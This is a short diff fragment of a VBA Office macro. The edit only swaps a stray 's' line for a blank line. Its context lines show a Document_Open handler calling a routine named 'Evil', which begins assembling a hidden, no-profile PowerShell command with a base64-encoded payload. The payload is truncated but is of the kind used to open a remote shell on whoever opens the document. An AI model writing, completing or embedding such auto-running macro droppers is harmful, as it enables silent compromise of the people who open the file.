@@ -37,7 +37,7 @@ End Sub
 Sub Document_Open()
     Evil
 End Sub
-s
+
 Sub Evil()
     Dim Str As String
     Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
